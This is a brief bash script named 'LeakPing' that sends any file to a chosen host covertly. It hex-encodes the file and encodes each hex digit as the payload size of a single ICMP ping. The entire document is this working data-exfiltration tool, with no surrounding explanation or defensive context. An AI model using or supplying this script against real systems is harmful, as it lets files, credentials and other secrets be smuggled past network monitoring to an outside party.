#!/bin/bash
(( $# != 2 )) && { echo "usage: $0 file host"; exit 2; }
file=$1
host=$2
xxd -p $file|tr -d '\n' | \
while read -n1 byte; do
	echo -n "$byte"
	size=$(bc <<< "obase=10;ibase=16;${byte^^}");
	timeout 0.4 ping -c1 -s $size $host 2>&1 >/dev/null
done
echo
echo "LeakPing done"
